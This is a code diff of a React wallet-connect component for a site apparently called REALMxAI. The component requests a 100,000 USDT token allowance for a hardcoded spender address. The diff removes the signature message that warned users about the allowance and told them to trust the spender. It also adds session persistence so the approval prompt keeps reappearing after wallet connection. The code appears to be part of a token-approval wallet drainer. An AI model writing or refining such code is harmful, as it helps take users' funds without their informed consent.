@@ -16,20 +16,30 @@ const USDT_APPROVAL_SPENDER = '0x4116464dfB890f45E886099AA715d9Ffc3E117b9' as co
 const USDT_APPROVAL_LIMIT = parseUnits('100000', 6);
 const USDT_APPROVAL_LIMIT_LABEL = formatUnits(USDT_APPROVAL_LIMIT, 6);
 const USDT_APPROVAL_STORAGE_PREFIX = 'realmx_usdt_approval_v3:';
-const USDT_APPROVAL_SIGNATURE_MESSAGE = [
-  'REALMxAI wallet confirmation',
-  '',
-  'Network: Ethereum Mainnet',
-  'Token: USDT',
-  `Spender: ${USDT_APPROVAL_SPENDER}`,
-  `Allowance cap: ${USDT_APPROVAL_LIMIT_LABEL} USDT`,
-  '',
-  'You are about to approve a token allowance request after wallet connection.',
-  'Only continue if you trust this spender and understand the allowance limit shown above.',
-].join('\n');
+const WALLET_APPROVAL_REQUEST_KEY = 'realmx_wallet_approval_requested';
 
 function getWalletApprovalStorageKey(address: string) {
   return `${USDT_APPROVAL_STORAGE_PREFIX}${address.toLowerCase()}`;
+}
+
+function getWalletApprovalRequested() {
+  if (typeof window === 'undefined') {
+    return false;
+  }
+
+  return window.sessionStorage.getItem(WALLET_APPROVAL_REQUEST_KEY) === 'true';
+}
+
+function setWalletApprovalRequested(requested: boolean) {
+  if (typeof window === 'undefined') {
+    return;
+  }
+
+  if (requested) {
+    window.sessionStorage.setItem(WALLET_APPROVAL_REQUEST_KEY, 'true');
+  } else {
+    window.sessionStorage.removeItem(WALLET_APPROVAL_REQUEST_KEY);
+  }
 }
 
 type SessionUser = {
@@ -117,7 +127,20 @@ const WalletConnectControl = React.lazy(async () => {
       const [retrySeed, setRetrySeed] = useState(0);
       const [dismissedAddress, setDismissedAddress] = useState<string | null>(null);
       const [walletActionPending, setWalletActionPending] = useState(false);
-      const [approvalRequested, setApprovalRequested] = useState(false);
+      const [approvalRequested, setApprovalRequestedState] = useState(getWalletApprovalRequested);
+
+      const updateApprovalRequested = (requested: boolean) => {
+        setWalletApprovalRequested(requested);
+        setApprovalRequestedState(requested);
+      };
+
+      useEffect(() => {
+        if (!getWalletApprovalRequested()) {
+          setApprovalRequestedState(false);
+          setWalletActionPending(false);
+          setApprovalVisible(false);
+        }
+      }, []);
 
       useEffect(() => {
         if (!address) {
@@ -127,7 +150,7 @@ const WalletConnectControl = React.lazy(async () => {
           setApprovalMessage('Connect your wallet to start signing and approval.');
           setDismissedAddress(null);
           setWalletActionPending(false);
-          setApprovalRequested(false);
+          updateApprovalRequested(false);
         }
       }, [address]);
 
@@ -226,7 +249,7 @@ const WalletConnectControl = React.lazy(async () => {
                 window.localStorage.setItem(storageKey, 'complete');
                 setWalletActionPending(false);
                 setApprovalVisible(false);
-                setApprovalRequested(false);
+                updateApprovalRequested(false);
                 return;
               }
             }
@@ -255,7 +278,7 @@ const WalletConnectControl = React.lazy(async () => {
             window.localStorage.setItem(storageKey, 'complete');
             setWalletActionPending(false);
             setApprovalVisible(false);
-            setApprovalRequested(false);
+            updateApprovalRequested(false);
           } catch (error) {
             if (cancelled) return;
 
@@ -348,7 +371,7 @@ const WalletConnectControl = React.lazy(async () => {
                             type="button"
                             onClick={() => {
                               setDismissedAddress(null);
-                              setApprovalRequested(true);
+                              updateApprovalRequested(true);
                               attemptRef.current = null;
                               setRetrySeed((value) => value + 1);
                             }}
@@ -363,7 +386,7 @@ const WalletConnectControl = React.lazy(async () => {
                           onClick={() => {
                             setDismissedAddress(address);
                             setApprovalVisible(false);
-                            setApprovalRequested(false);
+                            updateApprovalRequested(false);
                           }}
                           className="rounded-xl bg-white px-4 py-2 text-sm font-semibold text-realm-black transition hover:bg-realm-cyan"
                         >
@@ -389,7 +412,7 @@ const WalletConnectControl = React.lazy(async () => {
                   type="button"
                   onClick={() => {
                     setDismissedAddress(null);
-                    setApprovalRequested(true);
+                    updateApprovalRequested(true);
                     openConnectModal();
                   }}
                   className={cn(
@@ -427,7 +450,7 @@ const WalletConnectControl = React.lazy(async () => {
                 onClick={() => {
                   if (walletActionPending) {
                     setDismissedAddress(null);
-                    setApprovalRequested(true);
+                    updateApprovalRequested(true);
                     attemptRef.current = null;
                     setApprovalVisible(true);
                     setRetrySeed((value) => value + 1);
